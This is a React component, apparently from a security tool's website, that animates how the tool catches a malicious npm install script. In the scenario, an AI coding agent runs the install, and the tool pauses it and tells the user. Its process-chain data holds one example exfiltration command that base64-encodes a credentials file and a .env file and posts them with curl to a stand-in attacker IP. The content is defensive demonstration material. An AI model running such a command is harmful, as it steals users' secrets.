'use client';
import { useEffect, useRef, useState } from 'react';
import { Pug } from './brand.jsx';

const STEPS = [
  { k: 'The ask', t: 'You ask your agent to set up a project.', b: 'An ordinary request. The kind you make twenty times a day, and stop reading the answers to.' },
  { k: 'What you see', t: 'Its window shows one line and a checkmark.', b: 'npm install, 212 packages, four seconds. Nothing here asks for your attention.' },
  { k: 'What ran', t: 'Underneath, that one line was five processes deep.', b: 'The agent started a shell. The shell started npm. npm ran a package’s install script, and the script started a shell of its own. Harness follows every link.' },
  { k: 'The catch', t: 'One package reads a key and reaches for the network.', b: 'The script opens a credentials file, scrambles it, and starts an upload to a server nobody has heard of. The file is a decoy Harness planted. No honest task has a reason to open it.' },
  { k: 'The pull', t: 'Harness freezes the whole tree.', b: 'The agent and every process under it stop where they stand, before the upload finishes. Nothing is killed, so nothing is lost.' },
  { k: 'Your call', t: 'Then it tells you what happened, in plain English.', b: 'It names the package, not the agent, and it waits. End the session or let it continue. The decision stays with you.' },
];

const CHAIN = [
  { cmd: 'claude', who: 'the agent' },
  { cmd: 'zsh -lc "npm install"', who: 'the shell it started' },
  { cmd: 'npm install', who: 'what the window showed', tag: 'Note' },
  { cmd: 'node install.js', who: 'color-helpers · install script', hot: true },
  { cmd: 'sh -c "cat ~/.harness/bait/aws_credentials .env | base64 | curl -d @- 203.0.113.7"', who: 'started by the script', hot: true, long: true },
];

/** Counts toward a target so the score visibly falls instead of jumping. */
function useCount(target) {
  const [n, setN] = useState(target);
  const from = useRef(target);
  useEffect(() => {
    const start = from.current;
    if (start === target) return;
    if (matchMedia('(prefers-reduced-motion: reduce)').matches) { from.current = target; setN(target); return; }
    let raf; const t0 = performance.now();
    const tick = (t) => {
      const k = Math.min(1, (t - t0) / 900);
      const v = Math.round(start + (target - start) * (1 - (1 - k) ** 3));
      from.current = v; setN(v);
      if (k < 1) raf = requestAnimationFrame(tick);
    };
    raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
  }, [target]);
  return n;
}

export default function Scenario() {
  const ref = useRef(null);
  const [step, setStep] = useState(0);
  const [live, setLive] = useState(false);

  useEffect(() => {
    const el = ref.current;
    // Measured straight from the scroll event: a frame callback can be held back while the tab is in the background.
    const measure = () => {
      const r = el.getBoundingClientRect();
      const total = r.height - innerHeight;
      const p = Math.max(0, Math.min(1, -r.top / total));
      el.style.setProperty('--p', p.toFixed(4));
      setStep(Math.min(STEPS.length - 1, Math.floor(p * STEPS.length)));
      setLive(r.top < innerHeight * 0.45 && r.bottom > 0);
    };
    measure();
    addEventListener('scroll', measure, { passive: true });
    addEventListener('resize', measure);
    return () => { removeEventListener('scroll', measure); removeEventListener('resize', measure); };
  }, []);

  const go = (i) => {
    const el = ref.current;
    const total = el.offsetHeight - innerHeight;
    scrollTo({ top: el.getBoundingClientRect().top + scrollY + total * ((i + 0.5) / STEPS.length), behavior: 'smooth' });
  };

  const on = (n) => (step >= n ? ' on' : '');
  const score = useCount(step >= 3 ? 19 : step >= 1 ? 99 : 100);
  const level = score >= 90 ? 'Clear' : score >= 70 ? 'Steady' : score >= 40 ? 'Review' : 'Act';

  return (
    <section id="scenario" className="scn" ref={ref} data-step={step} data-live={live} aria-label="A scenario: what one install really runs">
      <div className="scn-stage">
        <div className="wrap scn-grid">
          <div className="scn-copy">
            <p className="eyebrow eyebrow-dark">One command, start to finish</p>
            <div className="scn-rail" role="tablist" aria-label="Scenario steps">
              <span className="scn-rail-line" aria-hidden="true"><i /></span>
              {STEPS.map((s, i) => (
                <button key={s.k} type="button" role="tab" aria-selected={step === i} className={step === i ? 'is-now' : step > i ? 'is-done' : ''} onClick={() => go(i)}>
                  <i aria-hidden="true" /><span>{s.k}</span>
                </button>
              ))}
            </div>
            <ol className="scn-caps">
              {STEPS.map((s, i) => (
                <li key={s.k} className={step === i ? 'is-now' : ''}>
                  <p className="scn-n"><b>{String(i + 1).padStart(2, '0')}</b> / 06</p>
                  <h2>{s.t}</h2>
                  <p>{s.b}</p>
                </li>
              ))}
            </ol>
          </div>

          <div className="scene" aria-hidden="true">
            <div className={`win${on(4)}`}>
              <div className="win-bar">
                <span className="win-dots"><i /><i /><i /></span>
                <span className="win-title">claude — my-app</span>
                <span className="win-paused">Paused by Harness</span>
              </div>
              <div className="fold win-fold"><div>
                <div className="win-body">
                  <p className="ln ln-prompt"><b>›</b><span className="type">set up the project and get it running</span></p>
                  <p className={`ln ln-tool${on(1)}`}><i className="ok" />Bash(npm install)</p>
                  <p className={`ln ln-out${on(1)}`}>⎿ added 212 packages in 4s</p>
                  <p className={`ln ln-say${on(1)}`}>All set. Run <code>npm run dev</code> to start the app.</p>
                </div>
                <p className="pane-tag">What the agent’s window shows</p>
              </div></div>
            </div>

            <div className={`fold hood-fold${on(2)}`}><div>
              <div className={`hood${on(2)}${step >= 3 ? ' hot' : ''}${step >= 4 ? ' frozen' : ''}`}>
                <div className="hood-top">
                  <p className="pane-tag pane-tag-teal">What Harness sees</p>
                  <p className={`meter lv-${level.toLowerCase()}`}><b>{score}</b><span>/ 100</span><em>{level}</em></p>
                </div>
                <ol className="chain">
                  {CHAIN.map((c, i) => (
                    <li key={c.cmd} style={{ '--i': i }} className={`${c.hot ? 'is-hot' : ''}${c.long ? ' is-long' : ''}`}>
                      <span className="elbow" />
                      <span className="chain-main">
                        <code>{c.cmd}</code>
                        <small>{c.who}</small>
                      </span>
                      <span className="chain-tags">
                        {c.tag && <b className="tag">{c.tag}</b>}
                        {c.hot && <b className="tag tag-bad">{c.long ? 'Decoy secret · upload' : 'Dangerous'}</b>}
                        <b className="tag tag-pause">Paused</b>
                      </span>
                    </li>
                  ))}
                </ol>
                <div className="wire">
                  <span className="wire-end">curl</span>
                  <span className="wire-track"><i /><i /><i /><b /></span>
                  <span className="wire-end wire-far">203.0.113.7<small>unknown server</small></span>
                  <span className="wire-stat"><span>uploading…</span><span>0 bytes sent</span></span>
                </div>
              </div>
            </div></div>

            <div className={`fold verdict-fold${on(4)}`}><div>
              <div className="verdict">
                <Pug size={46} />
                <div>
                  <p className="verdict-h">Harness paused Claude Code and 4 processes under it.</p>
                  <div className={`fold${on(5)}`}><div>
                    <p className="verdict-b">A package called <b>color-helpers</b> ran an install script that read a decoy AWS key and tried to send it to 203.0.113.7. Your agent did not ask for this.</p>
                    <p className="verdict-btns"><span className="vbtn vbtn-end">End session</span><span className="vbtn">Let it continue</span></p>
                  </div></div>
                </div>
              </div>
            </div></div>
          </div>
        </div>
        <button type="button" className={`scn-cue${step < STEPS.length - 1 ? ' is-on' : ''}`} onClick={() => go(step + 1)} disabled={step >= STEPS.length - 1} tabIndex={step < STEPS.length - 1 ? 0 : -1} aria-label="Go to the next step">
          <span>{step === 0 ? 'Scroll to step through' : 'Keep scrolling'}</span>
          <i aria-hidden="true"><svg viewBox="0 0 16 16" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"><path d="M8 2.5v11M3.5 9L8 13.5 12.5 9" /></svg></i>
        </button>
        <p className="scn-note">This walkthrough follows the scripted attack that ships with Harness. Real timing depends on a half-second check. <a href="/about#known-limits">What it can miss</a></p>
        <a className="scn-skip" href="#watch">Skip the walkthrough</a>
      </div>
    </section>
  );
}
